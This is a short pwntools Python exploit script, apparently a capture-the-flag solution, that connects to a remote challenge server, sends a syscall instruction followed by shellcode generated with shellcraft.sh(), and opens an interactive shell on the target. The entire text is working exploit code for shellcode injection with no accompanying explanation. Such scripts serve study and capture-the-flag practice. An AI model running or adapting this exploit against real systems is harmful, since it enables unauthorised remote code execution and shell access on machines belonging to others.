from pwn import *
context.arch = 'amd64'
#p = process('./pwn')
p = remote('gz.imxbt.cn',20187)
p.send(asm('syscall'))
p.send(b'a'*0x2+asm(shellcraft.sh()))
p.interactive()
